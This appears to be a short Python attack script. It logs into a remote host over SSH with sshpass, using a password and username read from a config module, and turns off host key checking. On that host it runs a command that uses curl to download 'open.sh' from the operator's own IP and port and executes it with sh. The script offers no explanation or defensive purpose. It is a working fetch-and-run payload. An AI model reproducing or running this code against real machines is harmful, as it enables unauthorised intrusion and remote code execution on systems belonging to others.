import config
import os
script = f'curl {config.your_ip}:{config.your_port}/open.sh >open.sh;sh open.sh'
command = f'sshpass -p {config._pass} ssh -o stricthostkeychecking=no -l {config._username} {config._ip} "{script}"'
#print("command: " + command)
os.system(command)
